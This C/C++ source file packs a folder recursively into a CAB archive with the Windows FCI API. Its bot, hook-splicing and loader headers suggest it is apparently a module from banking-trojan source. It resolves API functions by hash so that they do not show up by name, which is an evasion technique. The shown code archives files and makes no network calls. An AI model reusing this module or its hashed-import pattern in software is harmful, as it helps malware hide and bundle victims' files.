#include "CabPacker.h"
//#ifdef RuBnkH

typedef struct 
{
	ERF erf;
	CCAB cab;
	HFCI hfci;
} CABDATA, *PCABDATA;
/*#include <windows.h>
#include <fci.h>
#include <io.h>
#include <fcntl.h>
*/

#include "GetApi.h"
#include "Memory.h"
#include "Strings.h"
#include "BotUtils.h"
#include "Utils.h"
#include "Unhook.h"
#include "Splice.h"
#include "Loader.h"
#include "Unhook.h"
#include "BotConfig.h"
#include "ntdll.h"



//cab packing

LPVOID DIAMONDAPI FN_FCIALLOC( ULONG cb )
{
	return MemAlloc( cb );
}

void DIAMONDAPI FN_FCIFREE( void HUGE *lpMem )
{
	if( lpMem )
	{
		MemFree( lpMem );
	}
}

INT_PTR DIAMONDAPI FN_FCIOPEN( char FAR *pszFile, int oflag, int pmode, int FAR *err, void FAR *pv )
{
	HANDLE hFile = NULL;

    DWORD dwDesiredAccess		= 0; 
    DWORD dwCreationDisposition = 0;

    UNREFERENCED_PARAMETER(pv);
    UNREFERENCED_PARAMETER(pmode);

    if ( oflag & _O_RDWR )
    {
        dwDesiredAccess = GENERIC_READ | GENERIC_WRITE;
    }
    else if ( oflag & _O_WRONLY )
    {
        dwDesiredAccess = GENERIC_WRITE;
    }
    else
    {
        dwDesiredAccess = GENERIC_READ;
    }

    if ( oflag & _O_CREAT )
    {
        dwCreationDisposition = CREATE_ALWAYS;
    }
    else
    {
        dwCreationDisposition = OPEN_EXISTING;
    }

    hFile = (HANDLE)pCreateFileA(pszFile, 
                        dwDesiredAccess,
                        FILE_SHARE_READ,
                        NULL,
                        dwCreationDisposition,
                        FILE_ATTRIBUTE_NORMAL,
                        NULL);

    if ( hFile == INVALID_HANDLE_VALUE )
    {
        *err = pGetLastError();
    }

    return (INT_PTR)hFile;
}


UINT DIAMONDAPI FN_FCIREAD( INT_PTR hf, void FAR *memory, UINT cb, int FAR *err, void FAR *pv)
{
	DWORD dwBytesRead = 0;

    UNREFERENCED_PARAMETER(pv);

    if( (BOOL)pReadFile((HANDLE)hf, memory, cb, &dwBytesRead, NULL) == FALSE )
    {
        dwBytesRead = (DWORD)-1;
        *err = pGetLastError();
    }
		 
    return dwBytesRead;
}

UINT DIAMONDAPI FN_FCIWRITE( INT_PTR hf, void FAR *memory, UINT cb, int FAR *err, void FAR *pv )
{
	DWORD dwBytesWritten = 0;

    UNREFERENCED_PARAMETER(pv);

    if ( (BOOL)pWriteFile( (HANDLE)hf, memory, cb, &dwBytesWritten, NULL) == FALSE )
    {
        dwBytesWritten = (DWORD)-1;
        *err = pGetLastError();
    }

    return dwBytesWritten;
}


int DIAMONDAPI FN_FCICLOSE( INT_PTR hf, int FAR *err, void FAR *pv )
{
	INT iResult = 0; 

    UNREFERENCED_PARAMETER(pv);
    
    if ( pCloseHandle((HANDLE)hf) == FALSE)
    {
        *err = pGetLastError();
        iResult = -1;
    }

    return iResult;
}

long DIAMONDAPI FN_FCISEEK( INT_PTR hf, long dist, int seektype, int FAR *err, void FAR *pv )
{
	INT iResult = 0;

    UNREFERENCED_PARAMETER(pv);

    iResult = (INT)pSetFilePointer((HANDLE)hf, dist, NULL, seektype);

    if ( iResult == -1 )
    {
        *err = pGetLastError();
    }

    return iResult;
}


int DIAMONDAPI FN_FCIDELETE( char FAR *pszFile, int FAR *err, void FAR *pv )
{
	INT iResult = 0;

    UNREFERENCED_PARAMETER(pv);

    if ( (BOOL)pDeleteFileA(pszFile) == FALSE)
    {
        *err = pGetLastError();
        iResult = -1;
    }

    return iResult;
}


long DIAMONDAPI FN_FCISTATUS( UINT typeStatus, ULONG  cb1, ULONG  cb2, void FAR *pv )
{
	return 0;
}

int DIAMONDAPI FN_FCIFILEPLACED( PCCAB pccab, char *pszFile, long  cbFile, BOOL  fContinuation, void FAR *pv )
{
	return 0;
}


INT_PTR DIAMONDAPI FN_FCIGETOPENINFO( char *pszName, USHORT *pdate, USHORT *ptime, USHORT *pattribs, int FAR *err, void FAR *pv )
{
	HANDLE hFile;
    FILETIME fileTime;
    BY_HANDLE_FILE_INFORMATION fileInfo;

    hFile = (HANDLE)FN_FCIOPEN(pszName, _O_RDONLY, 0, err, pv);

    if ( hFile != (HANDLE)-1 )
    {
        if( pGetFileInformationByHandle(hFile, &fileInfo) 
        &&  pFileTimeToLocalFileTime(&fileInfo.ftCreationTime, &fileTime)
        &&  pFileTimeToDosDateTime(&fileTime, pdate, ptime) )
        {
            *pattribs = (USHORT)fileInfo.dwFileAttributes;
            *pattribs &= ( _A_RDONLY | _A_HIDDEN | _A_SYSTEM | _A_ARCH );
        }
        else
        {
            FN_FCICLOSE((INT_PTR)hFile, err, pv);
            hFile = (HANDLE)-1;
        }
    }

    return (INT_PTR)hFile;
}


BOOL DIAMONDAPI FN_FCIGETTEMPFILE( char *pszTempName, int cbTempName, void FAR *pv )
{
	BOOL bSucceeded = FALSE;
    CHAR pszTempPath[MAX_PATH];

    UNREFERENCED_PARAMETER(pv);
    UNREFERENCED_PARAMETER(cbTempName);

    if( (DWORD)pGetTempPathA(MAX_PATH, pszTempPath) != 0 )
    {
        if( (DWORD)pGetTempFileNameA(pszTempPath, "CABINET", 0, pszTempName) != 0 )
        {
            bSucceeded = TRUE;
        }
    }

    return bSucceeded;
}

BOOL DIAMONDAPI FN_FCIGETNEXTCABINET(
	PCCAB  pccab,
	ULONG  cbPrevCab,
	void FAR *pv)
{
	return FALSE;
}




HCAB CreateCab( const char *szCabName )
{
	PCABDATA pC = (PCABDATA)MemAlloc( sizeof( CABDATA ) );
	plstrcpyA( pC->cab.szCab, szCabName );
	pC->cab.cb = 0x7FFFFFFF;

	typedef HFCI (*PFCICreate )( PERF perf, PFNFCIFILEPLACED pfnfiledest, PFNFCIALLOC pfnalloc,
											 PFNFCIFREE pfnfree, PFNFCIOPEN pfnopen, PFNFCIREAD pfnread, PFNFCIWRITE pfnwrite,
											 PFNFCICLOSE pfnclose, PFNFCISEEK pfnseek, PFNFCIDELETE pfndelete, PFNFCIGETTEMPFILE pfnfcigtf,
											 PCCAB pccab, void FAR *pv );

	PFCICreate pFCICreate = (PFCICreate)GetProcAddressEx( NULL, 13, 0x6A3F5C7A );

	pC->hfci = pFCICreate(
		&(pC->erf),
		FN_FCIFILEPLACED, 
		FN_FCIALLOC,
		FN_FCIFREE,
		FN_FCIOPEN,
		FN_FCIREAD,
		FN_FCIWRITE,
		FN_FCICLOSE,
		FN_FCISEEK,
		FN_FCIDELETE,
		FN_FCIGETTEMPFILE,
		&(pC->cab),
		0 );

	if( pC->hfci == NULL )
	{
		MemFree( pC );
		return 0;
	}

	return pC;
}


bool AddFileToCab( HCAB handle, const char *szFileName, const char *szInternalName )
{
	if( handle == NULL )
	{
		return false;
	}

	CABDATA *pC = (CABDATA*)handle;

	typedef BOOL (*PFCIAddFile )( HFCI hfci, LPSTR pszSourceFile, LPSTR pszFileName, BOOL fExecute, PFNFCIGETNEXTCABINET GetNextCab,
								  PFNFCISTATUS pfnProgress, PFNFCIGETOPENINFO pfnOpenInfo, TCOMP typeCompress );

	PFCIAddFile pFCIAddFile = (PFCIAddFile)GetProcAddressEx( NULL, 13, 0xB497160 );

	if( pFCIAddFile( pC->hfci, (char*)szFileName, (char*)szInternalName, FALSE, FN_FCIGETNEXTCABINET, FN_FCISTATUS, FN_FCIGETOPENINFO, tcompTYPE_MSZIP ))
	{
		return true;
	}

	return false;
}



void CloseCab( HCAB handle )
{
	if( handle == NULL )
	{
		return;
	}

	CABDATA *pC = (CABDATA*)handle;

	typedef BOOL (*PFCIDestroy)( HFCI hfci );
	typedef BOOL (*FCIFlushCabinet)( HFCI hfci, BOOL fGetNextCab, PFNFCIGETNEXTCABINET GetNextCab, PFNFCISTATUS pfnProgress );

	PFCIDestroy pFCIDestroy			 = (PFCIDestroy)GetProcAddressEx( NULL, 13, 0x7D0FA4F5 );
	FCIFlushCabinet	pFCIFlushCabinet = (FCIFlushCabinet)GetProcAddressEx( NULL, 13, 0xC27267DA );


	pFCIFlushCabinet(
		pC->hfci,
		FALSE,
		FN_FCIGETNEXTCABINET,
		FN_FCISTATUS );

	pFCIDestroy( pC->hfci );

	MemFree( pC );
}


struct FILEENTRY
{
	char szName[MAX_PATH];
	char szIName[MAX_PATH];
	FILEENTRY *pNext;
};

void FreeList(
	FILEENTRY **ppFiles )
{
	while( *ppFiles )
	{
		FILEENTRY *toDelete = *ppFiles;
		*ppFiles = (*ppFiles)->pNext;

		MemFree( toDelete );
	}
}

void ScanFiles(
	const char *szDirName, const char *szInternalName,
	FILEENTRY **ppFiles )
{
	char findmask[MAX_PATH];
	m_memset( findmask, 0, MAX_PATH );

	plstrcpyA( findmask, szDirName );
	plstrcatA( findmask, "\\*.*" );

	WIN32_FIND_DATA fdata;
	m_memset( &fdata, 0, sizeof( WIN32_FIND_DATA ) );

	HANDLE hFind = pFindFirstFileA( findmask, &fdata );
	if( hFind != INVALID_HANDLE_VALUE )
	{
		do
		{
			if( fdata.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY )
			{
				if( plstrcmpA(fdata.cFileName,".") != 0 &&
					plstrcmpA(fdata.cFileName,"..") != 0 )
				{
					char findmask2[MAX_PATH];
					m_memset( findmask2, 0, MAX_PATH );

					plstrcpyA( findmask2, szDirName );
					plstrcatA( findmask2, "\\" );
					plstrcatA( findmask2, fdata.cFileName );

					char findmask3[MAX_PATH];
					m_memset( findmask3, 0, MAX_PATH );

					plstrcpyA( findmask3, szInternalName );
					plstrcatA( findmask3, "\\" );
					plstrcatA( findmask3, fdata.cFileName );

					ScanFiles( findmask2, findmask3, ppFiles );
				}
			}
			else
			{
				char fullname[MAX_PATH];
				m_memset( fullname, 0, MAX_PATH );

				plstrcpyA( fullname, szDirName );
				plstrcatA( fullname, "\\" );
				plstrcatA( fullname, fdata.cFileName );

				char iname[MAX_PATH];
				m_memset( iname, 0, MAX_PATH );

				plstrcpyA( iname, szInternalName );
				plstrcatA( iname, "\\" );
				plstrcatA( iname, fdata.cFileName );

				if( *ppFiles == NULL )
				{
					*ppFiles = (FILEENTRY*)MemAlloc( sizeof( FILEENTRY ) );
					(*ppFiles)->pNext = 0;
				}
				else
				{
					FILEENTRY *p = (FILEENTRY*)MemAlloc( sizeof( FILEENTRY ) );
					p->pNext = *ppFiles;
					*ppFiles = p;
				}

				plstrcpyA( (*ppFiles)->szName, fullname );
				plstrcpyA( (*ppFiles)->szIName, iname );
			}
		}
		while( pFindNextFileA( hFind, &fdata ) );

		pFindClose( hFind );
	}
}

bool AddDirToCab( HCAB handle, const char *szDirName, const char *szInternalName )
{
	pOutputDebugStringA(szDirName);
	FILEENTRY *pFiles = 0;
	ScanFiles( szDirName, szInternalName, &pFiles );

	if( pFiles )
	{
		for( FILEENTRY *p = pFiles; p != NULL; p=p->pNext )
		{			
			if( !AddFileToCab( handle, p->szName, p->szIName ) )
			{				
				FreeList( &pFiles );
				return false;
			}		
		}
	}

	FreeList( &pFiles );
	return true;
}

void Test()
{
	HCAB h = CreateCab( "h:\\my.cab" );
	AddDirToCab( h, "H:\\Folder", "Folder" );
	CloseCab( h );

	return;
}
//#endif